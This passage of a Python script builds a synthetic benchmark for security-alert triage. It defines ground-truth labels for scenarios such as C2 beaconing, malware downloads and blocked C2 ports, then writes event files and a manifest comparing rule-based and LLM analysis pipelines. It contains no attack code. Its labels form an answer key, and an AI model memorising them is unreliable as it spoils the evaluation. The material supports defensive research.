    ("SOC-013", "SOC-013-E02", "benign", "Part of suspicious-but-inconclusive sequence.", [], True),
    ("SOC-013", "SOC-013-E03", "benign", "Successful login from different IP than failures. Inconclusive — could be legitimate admin access.", [], True),

    # Suricata scenarios
    ("SOC-014", "SOC-014-E01", "malicious", "SSH connection from known C2 IP 185.20.10.1. Suricata flagged as suspicious.", [], True),

    ("SOC-015", "SOC-015-E01", "benign", "Normal outbound HTTP flow to 93.184.216.34 (example.com). No alert generated.", [], False),

    ("SOC-016", "SOC-016-E01", "malicious", "Emotet malware download detected by Suricata. Compromised host making outbound connection.", [], True),

    ("SOC-017", "SOC-017-E01", "malicious", "C2 beaconing to 185.20.10.1. APT29 infrastructure.", [], True),
    ("SOC-017", "SOC-017-E02", "malicious", "Exact duplicate of SOC-017-E01. Should be deduplicated by L1.", [], True),

    ("SOC-018", "SOC-018-E01", "benign", "DNS query to update.suspicious-software-test.com. Domain name looks suspicious but no alert generated and no known IOC match.", [], False),

    ("SOC-019", "SOC-019-E01", "malicious", "C2 beaconing behavior detected by Suricata. APT29 beaconing to 185.20.10.1.", [], True),

    ("SOC-020", "SOC-020-E01", "benign", "Port scan alert from 198.51.100.20. Low severity (3). Suspicious but no confirmed malicious activity.", [], False),

    ("SOC-021", "SOC-021-E01", "benign", "Normal TLS connection to Cloudflare CDN. Legitimate traffic.", [], False),

    ("SOC-022", "SOC-022-E01", "benign", "Alert with missing severity field. Informational signature only. Edge case for schema handling.", [], False),

    ("SOC-023", "SOC-023-E01", "benign", "Low severity (3) informational DNS alert. Not suspicious traffic.", [], False),

    # Firewall scenarios
    ("SOC-024", "SOC-024-E01", "benign", "Firewall blocked outbound to port 4444 (common C2 port). Suspicious but firewall already blocked — no confirmed compromise.", [], True),

    ("SOC-025", "SOC-025-E01", "benign", "Normal outbound HTTPS to 1.1.1.1 (Cloudflare DNS). Routine traffic.", [], False),

    ("SOC-026", "SOC-026-E01", "benign", "Inbound HTTPS from known C2 IP 185.20.10.1 allowed by firewall rule. Suspicious but no rule engine trigger for firewall events.", [], True),
    ("SOC-026", "SOC-026-E02", "benign", "Part of repeated inbound from C2 IP.", [], True),
    ("SOC-026", "SOC-026-E03", "benign", "Part of repeated inbound from C2 IP.", [], True),

    ("SOC-027", "SOC-027-E01", "benign", "Firewall blocked outbound SMB to 185.20.10.1. Suspicious but blocked — no confirmed compromise.", [], True),

    ("SOC-028", "SOC-028-E01", "benign", "Normal outbound DNS to 8.8.8.8. Routine traffic.", [], False),

    ("SOC-029", "SOC-029-E01", "benign", "Firewall allow with missing destination port. Edge case for schema completeness.", [], False),

    ("SOC-030", "SOC-030-E01", "benign", "Inbound SSH from external IP 203.0.113.99 allowed by firewall rule. Suspicious but no rule engine trigger for firewall events.", [], False),

    # Generic scenarios
    ("SOC-031", "SOC-031-E01", "benign", "Minimal event with just event_type and message. No IPs, users, or network context. Insufficient evidence for classification.", [], False),

    ("SOC-032", "SOC-032-E01", "benign", "Conflicting event: authentication_success event_type but error message with 401 code. Ambiguous — labeled benign due to lack of confirmed malicious outcome.", [], False),

    ("SOC-033", "SOC-033-E01", "benign", "Normal cron job execution at 03:00 UTC. System user running backup script. Routine administrative activity.", [], False),

    ("SOC-034", "SOC-034-E01", "benign", "Successful login at 02:30 UTC (unusual time). Suspicious but no other indicators. Labeled benign due to internal source IP and known user.", [], False),

    ("SOC-035", "SOC-035-E01", "benign", "Event with missing timestamp. Edge case for normalization. Internal network connection — no threat indicators.", [], False),
]

# ===================================================================
# MAP RAW EVENT IDS TO COMPUTED EVENT IDS
# ===================================================================

all_id_maps = {}
for file_ids in [wazuh_ids, suricata_ids, firewall_ids, generic_ids]:
    for raw_id, computed_id, line_num in file_ids:
        all_id_maps[raw_id] = computed_id

# ===================================================================
# BUILD GROUND TRUTH DATASET
# ===================================================================

gt_labels = []
for scenario_id, raw_event_id, label, notes, expected_rules, rag_relevant in gt_definitions:
    computed_eid = all_id_maps.get(raw_event_id, "")
    gt_labels.append({
        "event_id": computed_eid,
        "label": label,
        "expected_rule_ids": expected_rules,
        "notes": f"[{scenario_id}] {notes} | RAG relevant: {rag_relevant}",
        "is_synthetic": True,
    })

ground_truth = {
    "dataset_id": "research_synthetic_v1",
    "name": "Research Synthetic Evaluation Dataset v1",
    "description": (
        "35 synthetic cybersecurity scenarios (55 raw events) across Wazuh, "
        "Suricata, Firewall, and Generic sources. Includes malicious, benign, "
        "suspicious, and edge-case events for fair comparison of five analysis "
        "architectures. Labels are manually assigned based on event content and "
        "are SYNTHETIC — not verified real-world incident outcomes."
    ),
    "is_synthetic": True,
    "labels": gt_labels,
}

# ===================================================================
# BUILD MANIFEST
# ===================================================================

# Count labels
label_counts = {"malicious": 0, "benign": 0}
for lbl in gt_labels:
    label_counts[lbl["label"]] += 1

# Count by source
source_counts = {
    "wazuh": len(wazuh_events),
    "suricata": len(suricata_events),
    "firewall": len(firewall_events),
    "generic": len(generic_events),
}

# Multi-event scenarios
multi_event_scenarios = ["SOC-001", "SOC-002", "SOC-010", "SOC-011", "SOC-012", "SOC-013", "SOC-017", "SOC-026"]
single_event_scenarios = [f"SOC-{i:03d}" for i in range(1, 36) if f"SOC-{i:03d}" not in multi_event_scenarios]

manifest = {
    "dataset_id": "research_synthetic_v1",
    "name": "Research Synthetic Evaluation Dataset v1",
    "version": "1.0.0",
    "created": "2026-10-20",
    "is_synthetic": True,
    "total_scenarios": 35,
    "total_raw_events": len(wazuh_events) + len(suricata_events) + len(firewall_events) + len(generic_events),
    "unique_events_after_dedup": None,  # computed at runtime by L1
    "label_distribution": label_counts,
    "source_distribution": source_counts,
    "multi_event_scenarios": multi_event_scenarios,
    "single_event_scenarios": single_event_scenarios,
    "edge_cases": [
        "SOC-009: Missing source IP and username",
        "SOC-010: Exact duplicate events (dedup test)",
        "SOC-017: Exact duplicate Suricata alert (dedup test)",
        "SOC-022: Missing severity field in Suricata alert",
        "SOC-029: Missing destination port in firewall event",
        "SOC-031: Minimal fields (no IPs, users, or network context)",
        "SOC-032: Conflicting information (success + error message)",
        "SOC-035: Missing timestamp",
    ],
    "rule_coverage": {
        "AUTH-001": ["SOC-001", "SOC-011"],
        "PRIV-001": ["SOC-005", "SOC-007"],
        "ASSET-001": [],
        "below_threshold": ["SOC-002", "SOC-012"],
        "no_rule_expected": ["SOC-003", "SOC-004", "SOC-008", "SOC-015", "SOC-025", "SOC-028"],
    },
    "rag_relevant_scenarios": [
        "SOC-001", "SOC-005", "SOC-006", "SOC-013",
        "SOC-014", "SOC-016", "SOC-017", "SOC-019",
        "SOC-024", "SOC-026", "SOC-027",
    ],
    "configuration_mapping": {
        "rule_based_only": "Rule-Based Only",
        "llm_only": "LLM Only",
        "llm_rag": "LLM + RAG",
        "llm_rule_based": "LLM + Rule-Based",
        "full_framework": "Proposed Complete Framework",
    },
    "files": {
        "events/wazuh_scenarios.json": f"{len(wazuh_events)} events",
        "events/suricata_scenarios.json": f"{len(suricata_events)} events",
        "events/firewall_scenarios.json": f"{len(firewall_events)} events",
        "events/generic_scenarios.json": f"{len(generic_events)} events",
        "ground_truth/research_ground_truth.json": f"{len(gt_labels)} labels",
    },
}

# ===================================================================
# WRITE FILES
# ===================================================================

# Create directories
(OUTPUT_DIR / "events").mkdir(parents=True, exist_ok=True)
(OUTPUT_DIR / "ground_truth").mkdir(parents=True, exist_ok=True)
(OUTPUT_DIR / "manifests").mkdir(parents=True, exist_ok=True)

# Write event files
(OUTPUT_DIR / "events" / "wazuh_scenarios.json").write_text(
    json.dumps(wazuh_events, indent=2, ensure_ascii=False), encoding="utf-8"
)
(OUTPUT_DIR / "events" / "suricata_scenarios.json").write_text(
    json.dumps(suricata_events, indent=2, ensure_ascii=False), encoding="utf-8"
)
(OUTPUT_DIR / "events" / "firewall_scenarios.json").write_text(
    json.dumps(firewall_events, indent=2, ensure_ascii=False), encoding="utf-8"
)
(OUTPUT_DIR / "events" / "generic_scenarios.json").write_text(
    json.dumps(generic_events, indent=2, ensure_ascii=False), encoding="utf-8"
)

# Write ground truth
(OUTPUT_DIR / "ground_truth" / "research_ground_truth.json").write_text(
    json.dumps(ground_truth, indent=2, ensure_ascii=False), encoding="utf-8"
)

# Write manifest
(OUTPUT_DIR / "manifests" / "dataset_manifest.json").write_text(
    json.dumps(manifest, indent=2, ensure_ascii=False), encoding="utf-8"
)

# Print summary
print(f"Wazuh events: {len(wazuh_events)}")
print(f"Suricata events: {len(suricata_events)}")
print(f"Firewall events: {len(firewall_events)}")
print(f"Generic events: {len(generic_events)}")
print(f"Total raw events: {len(wazuh_events) + len(suricata_events) + len(firewall_events) + len(generic_events)}")
print(f"Ground truth labels: {len(gt_labels)}")
print(f"Malicious: {label_counts['malicious']}")
print(f"Benign: {label_counts['benign']}")
print(f"Scenarios: 35")
print(f"Multi-event scenarios: {len(multi_event_scenarios)}")
print(f"Single-event scenarios: {len(single_event_scenarios)}")
print("\nSample event_id mappings:")
for raw_id, computed_id, line_num in wazuh_ids[:5]:
    print(f"  {raw_id} (line {line_num}) -> {computed_id}")
for raw_id, computed_id, line_num in suricata_ids[:3]:
    print(f"  {raw_id} (line {line_num}) -> {computed_id}")
print("\nAll files written to:", OUTPUT_DIR)
